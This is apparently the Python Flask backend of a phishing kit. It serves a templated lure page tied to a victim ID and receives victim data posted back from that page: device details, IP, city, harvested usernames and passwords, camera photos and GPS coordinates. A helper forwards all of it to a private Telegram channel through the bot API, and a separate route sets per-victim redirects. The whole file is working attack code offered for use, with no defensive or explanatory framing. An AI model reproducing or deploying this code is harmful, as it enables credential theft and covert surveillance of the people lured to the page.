from flask import Flask, request, jsonify, render_template_string
import requests
import json
import os
import base64
import time
from config import BOT_TOKEN, PRIVATE_CHANNEL_ID

app = Flask(__name__)
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
user_redirects = {}

@app.route('/p/<uid>')
def phishing_page(uid):
    target_type = request.args.get('type', 'cam')
    victim_id = request.args.get('v', 'unknown')
    redirect_url = user_redirects.get(victim_id, 'https://google.com')
    with open('web/index.html', 'r') as f:
        html = f.read()
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    return html

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error", "msg": "No data"}), 400
    forward_to_channel(data)
    return jsonify({"status": "ok"})

def forward_to_channel(data):
    try:
        text = f"📥 *New Victim Data*\n🆔 ID: {data.get('victim_id', 'Unknown')}\n"
        device = data.get('device_info', {})
        if device:
            text += f"📱 Device: {device.get('userAgent', 'N/A')[:60]}...\n"
            text += f"🔋 Battery: {device.get('battery', 'N/A')}\n📶 Network: {device.get('network', 'N/A')}\n"
        text += f"🌐 IP: {data.get('ip', 'Unknown')}\n📍 City: {data.get('city', 'Unknown')}\n"
        creds = data.get('creds')
        if creds:
            text += f"🔑 Platform: {creds.get('platform', 'N/A')}\n👤 Username: {creds.get('username', 'N/A')}\n🔒 Password: {creds.get('password', 'N/A')}\n"
        requests.post(f"{BOT_API}/sendMessage", json={"chat_id": PRIVATE_CHANNEL_ID, "text": text, "parse_mode": "Markdown"}, timeout=10)
        photo_data = data.get('photo')
        if photo_data and photo_data.startswith('data:image'):
            try:
                photo_base64 = photo_data.split(',')[1]
                with open('temp.jpg', 'wb') as f: f.write(base64.b64decode(photo_base64))
                with open('temp.jpg', 'rb') as f:
                    requests.post(f"{BOT_API}/sendPhoto", data={"chat_id": PRIVATE_CHANNEL_ID}, files={"photo": f}, timeout=10)
                os.remove('temp.jpg')
            except: pass
        loc = data.get('location')
        if loc and loc.get('lat') and loc.get('lng'):
            requests.post(f"{BOT_API}/sendLocation", json={"chat_id": PRIVATE_CHANNEL_ID, "latitude": loc['lat'], "longitude": loc['lng']}, timeout=10)
    except Exception as e:
        print(f"Forward error: {e}")

@app.route('/set_redirect/<victim_id>', methods=['POST'])
def set_redirect(victim_id):
    url = request.json.get('url')
    if url and url.startswith('http'):
        user_redirects[victim_id] = url
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"}), 400

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
